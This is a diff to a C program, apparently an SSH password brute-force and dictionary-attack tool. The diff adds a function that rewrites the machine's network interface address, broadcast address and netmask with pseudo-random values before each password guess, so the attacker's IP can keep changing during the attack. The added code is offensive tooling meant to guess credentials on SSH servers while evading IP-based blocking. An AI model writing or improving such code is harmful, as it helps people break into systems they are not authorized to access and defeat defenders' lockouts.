@@ -6,9 +6,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <libssh/libssh.h>
-#if defined(WIN32) && !defined(UNIX)
+#if _WIN32
 #define cls "cls"   /* Do windows stuff */
-#elif defined(UNIX) && !defined(WIN32)
+#elif __linux__
+#include <time.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <error.h>
 #define cls "clear" /* Do linux stuff */
 #else
 #define cls "clear" /* If you are not sure, make it a Linux command. */
@@ -26,6 +34,73 @@ void logo() {
     puts("");
     printf("          ---==[ creator: ware255 ]==---  \n");
 }
+
+#if __linux__
+unsigned int xor64(unsigned long w) {
+    static unsigned long x;
+    x = w;
+    x ^= (x << 7);
+    return x ^= (x >> 9);
+}
+
+void fake_ip() {
+    struct ifreq ifreq;
+    struct sockaddr_in *sin;
+    char buf[INET_ADDRSTRLEN];
+    char ip[16];
+
+    int soc = socket(PF_PACKET, SOCK_RAW, 0);
+    if(soc < 0) {
+        perror("[-]socket()");
+        exit(1);
+    }
+
+    unsigned long w = (unsigned long)time(NULL);
+
+    //IPアドレスの取得
+    memset(&ifreq, 0, sizeof(struct ifreq));
+    strncpy(ifreq.ifr_name, "eth1", sizeof(ifreq.ifr_name) - 1);
+    if(ioctl(soc, SIOCGIFADDR, &ifreq) < 0){
+        perror("[-]ioctl(SIOCGIFADDR)");
+        close(soc);
+        exit(1);
+    }
+
+    //IPアドレスを見やすいように表示する
+    sin = (struct sockaddr_in *)&ifreq.ifr_addr;
+    inet_ntop(AF_INET, &sin->sin_addr.s_addr, buf, sizeof(buf));
+
+    //IPアドレスの書き換え
+    sprintf(ip, "192.168.24.%d", xor64(w) % 255);
+    sin->sin_addr.s_addr = inet_addr(ip);
+    if (ioctl(soc, SIOCSIFADDR, &ifreq) < 0) {
+        perror("[-]ioctl(SIOCSIFADDR)");
+        close(soc);
+        exit(1);
+    }
+
+    sprintf(ip, "192.168.25.%d", xor64(w) % 255);
+    sin = (struct sockaddr_in *)&ifreq.ifr_broadaddr;
+    sin->sin_addr.s_addr = inet_addr(ip);
+    if (ioctl(soc, SIOCSIFBRDADDR, &ifreq) < 0) {
+        perror("[-]ioctl(SIOCSIFBRDADDR)");
+        close(soc);
+        exit(1);
+    }
+
+    sprintf(ip, "255.255.%d.%d", xor64(w) % 255, xor64(w) % 255);
+    sin = (struct sockaddr_in *)&ifreq.ifr_netmask;
+    sin->sin_addr.s_addr = inet_addr(ip);
+    if (ioctl(soc, SIOCSIFNETMASK, &ifreq) < 0) {
+        perror("[-]iocrl(SIOCSIFNETMASK)");
+        close(soc);
+        exit(1);
+    }
+
+    close(soc);
+    return;
+}
+#endif
 
 //コマンドを一回だけ実行させる
 int show_remote_processes(ssh_session session) {
@@ -126,6 +201,13 @@ void dictionary_attack(char host[], char name[], int *port) {
     printf("\nEnter a file name.\n: ");
     fgets(filename, sizeof(filename), stdin);
     filename[strcspn(filename, "\n")] = 0;
+#if __linux__
+    char bol[2];
+    logo();
+    printf("\nDo you want the IP address to change every time?[y/n]\n: ");
+    fgets(bol, sizeof(bol), stdin);
+    bol[strcspn(bol, "\n")] = 0;
+#endif
     FILE *fp;
     if ((fp = fopen(filename, "r")) == NULL) {
         printf("Error: Could not open file.\n");
@@ -135,6 +217,9 @@ void dictionary_attack(char host[], char name[], int *port) {
     for (i = 0; i <= strlen(host); i++) ip[i] = host[i];
     for (i = 0; i <= strlen(name); i++) user[i] = name[i];
     while (fgets(str, MAXLEN, fp) != NULL) {
+#if __linux__
+        if (bol[0] == 'y') fake_ip();
+#endif
         str[strcspn(str, "\n")] = 0;
         if ((*p_func)(ip, user, *port, str) == 0) {
             logical = 1;
@@ -158,9 +243,20 @@ void brute_force_attack(char host[], char name[], int *port) {
     int index[MAXLEN + 1] = {0};
     int i, carry;
     size_t j;
+#if __linux__
+    char bol[2];
+    logo();
+    printf("\nDo you want the IP address to change every time?[y/n]\n: ");
+    fgets(bol, sizeof(bol), stdin);
+    bol[strcspn(bol, "\n")] = 0;
+#endif
     for (j = 0; j <= strlen(host); j++) ip[j] = host[j];
     for (j = 0; j <= strlen(name); j++) user[j] = name[j];
+    printf("\nAnalyzing %s password...\n", host);
     do {
+#if __linux__
+        if (bol[0] == 'y') fake_ip();
+#endif
         if ((*p_func)(ip, user, *port, str) == 0) {
             break;
         }
@@ -203,7 +299,6 @@ int main(int argc, char* argv[]) {
     mode = atoi(c_mode);
     switch (mode) {
     case 1:
-        printf("\nAnalyzing %s password...\n", argv[2]);
         brute_force_attack(argv[2], argv[6], &port);
         break;
     case 2:
